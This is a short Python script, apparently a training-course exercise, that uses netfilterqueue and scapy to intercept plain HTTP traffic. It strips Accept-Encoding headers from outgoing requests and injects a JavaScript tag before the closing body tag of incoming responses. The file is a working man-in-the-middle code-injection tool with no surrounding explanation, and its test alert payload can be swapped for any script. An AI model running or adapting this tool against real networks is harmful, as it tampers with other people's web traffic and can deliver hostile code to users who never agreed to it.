#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy
import re

def mod_packet(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def work_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.Raw):
        if use_packet[scapy.TCP].dport == 80:
            print("[+] REQUEST##############")
            mod_req = re.sub("Accept-Encoding:.*?\\r\\n", "", use_packet[scapy.Raw].load)
            new_packet = mod_packet(use_packet, mod_req)
            packet.set_payload(str(new_packet))
        elif use_packet[scapy.TCP].sport == 80:
            print("[+] RESPONSE#############")
            insert = "<script>alert('test');</script>" + "</body>"
            mod_resp = use_packet[scapy.Raw].load.replace("</body>", insert)
            new_packet = mod_packet(use_packet, mod_resp)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netq.NetfilterQueue()
queue.bind(0, work_packet)
queue.run()